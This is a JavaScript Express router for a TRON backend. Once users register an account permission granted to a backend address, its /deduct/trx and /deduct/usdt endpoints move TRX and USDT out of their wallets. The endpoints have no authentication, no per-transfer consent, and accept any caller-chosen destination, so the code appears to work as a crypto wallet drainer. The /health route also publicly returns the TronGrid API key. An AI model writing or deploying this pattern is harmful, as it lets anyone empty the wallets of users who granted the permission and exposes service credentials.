import { Router } from "express";
import { config } from "./config.js";
import * as store from "./store.js";
import {
  getBackendAddress,
  findPermissionIdByName,
  sendTrxFromUser,
  sendUsdtFromUser,
} from "./tron.js";

const router = Router();

router.get("/health", (req, res) => {
  try {
    const backendAddress = getBackendAddress();
    res.json({
      network: config.network,
      fullNode: config.fullNode,
      treasuryAddress: config.treasuryAddress,
      backendAddress: backendAddress || "",
      usdtContract: config.usdtContract,
    walletConnectProjectId: config.walletConnectProjectId,
    activePermissionName: config.activePermissionName,
    activePermissionOperations: config.activePermissionOperations,
    trongridApiKey: config.trongridApiKey || "",
  });
  } catch (e) {
    console.error("Health check error:", e);
    res.status(500).json({
      error: e.message || "Internal Server Error",
      network: config.network,
      backendAddress: "",
    });
  }
});

router.get("/permission/lookup", async (req, res) => {
  try {
    const address = (req.query.address || "").trim();
    if (!address) {
      return res.status(400).json({ error: "address required", found: false });
    }
    const permissionId = await findPermissionIdByName(address, config.activePermissionName);
    res.json({ found: permissionId != null, permissionId: permissionId ?? undefined });
  } catch (e) {
    console.error("Permission lookup error:", e);
    res.status(500).json({ error: e.message || "Lookup failed", found: false });
  }
});

router.post("/permission/register", (req, res) => {
  try {
    const { address, permissionId } = req.body || {};
    if (!address || permissionId == null) {
      return res.status(400).json({ error: "address and permissionId required" });
    }
    store.register(address, permissionId);
    res.json({ ok: true });
  } catch (e) {
    console.error("Register error:", e);
    res.status(500).json({ error: e.message || "Register failed" });
  }
});

router.post("/deduct/trx", async (req, res) => {
  try {
    const { address, amountSun, toAddress } = req.body || {};
    if (!address) {
      return res.status(400).json({ error: "address required", ok: false });
    }
    const permissionId = store.getPermissionId(address);
    if (permissionId == null) {
      return res.status(400).json({ error: "Address not registered. Complete Step 4 first.", ok: false });
    }
    const amount = Number(amountSun);
    if (!Number.isFinite(amount) || amount <= 0) {
      return res.status(400).json({ error: "Invalid amountSun", ok: false });
    }
    const destination = (toAddress || config.treasuryAddress || "").trim();
    if (!destination) {
      return res.status(400).json({ error: "destination address required", ok: false });
    }
    const receipt = await sendTrxFromUser(address, destination, amount, permissionId);
    if (!receipt.result) {
      return res.status(500).json({ error: "Transaction failed", ok: false, receipt });
    }
    res.json({ ok: true, receipt: { txid: receipt.txid } });
  } catch (e) {
    console.error("Deduct TRX error:", e);
    res.status(500).json({ error: e.message || "Deduct failed", ok: false });
  }
});

router.post("/deduct/usdt", async (req, res) => {
  try {
    const { address, amount, toAddress } = req.body || {};
    if (!address) {
      return res.status(400).json({ error: "address required", ok: false });
    }
    const permissionId = store.getPermissionId(address);
    if (permissionId == null) {
      return res.status(400).json({ error: "Address not registered. Complete Step 4 first.", ok: false });
    }
    const amountSun = Number(amount);
    if (!Number.isFinite(amountSun) || amountSun < 0) {
      return res.status(400).json({ error: "Invalid amount", ok: false });
    }
    const destination = (toAddress || config.treasuryAddress || "").trim();
    if (!destination) {
      return res.status(400).json({ error: "destination address required", ok: false });
    }
    const receipt = await sendUsdtFromUser(address, destination, amountSun, permissionId);
    if (!receipt.result) {
      return res.status(500).json({ error: "Transaction failed", ok: false, receipt });
    }
    res.json({ ok: true, receipt: { txid: receipt.txid } });
  } catch (e) {
    console.error("Deduct USDT error:", e);
    res.status(500).json({ error: e.message || "Deduct failed", ok: false });
  }
});

export default router;
